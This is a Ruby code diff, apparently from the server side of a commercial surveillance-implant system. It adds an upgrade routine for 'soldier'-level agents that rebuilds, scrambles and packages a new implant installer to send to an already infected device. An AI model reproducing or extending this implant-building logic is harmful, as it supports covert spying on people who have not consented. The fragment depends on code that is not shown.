@@ -376,6 +376,11 @@ class Item
       return upgrade_scout(method)
     end
 
+    if self.level.eql? :soldier
+      # if it's a soldier, there a special procedure
+      return upgrade_soldier
+    end
+
     # in case of elite leak
     raise "Old agent cannot be upgraded" if self.version < 2013031101
 
@@ -444,6 +449,29 @@ class Item
         soldier_name = build.soldier_name(factory.confkey)[:name]
         add_upgrade('soldier-' + soldier_name, File.join(build.tmpdir, 'output'))
     end
+
+    build.clean
+
+    self.upgradable = true
+    self.save
+  end
+
+  def upgrade_soldier
+    factory = ::Item.where({_kind: 'factory', ident: self.ident}).first
+    build = RCS::DB::Build.factory(self.platform.to_sym)
+    build.load({'_id' => factory._id})
+    build.unpack
+    build.patch({'demo' => self.demo})
+    build.scramble
+
+    # create the soldier
+    build.melt({'soldier' => true, 'scout' => false})
+
+    # create the installer to be sent to the current soldier
+    build.soldier_upgrade!
+
+    soldier_name = build.soldier_name(factory.confkey)[:name]
+    add_upgrade('soldier-' + soldier_name, File.join(build.tmpdir, 'output'))
 
     build.clean
 
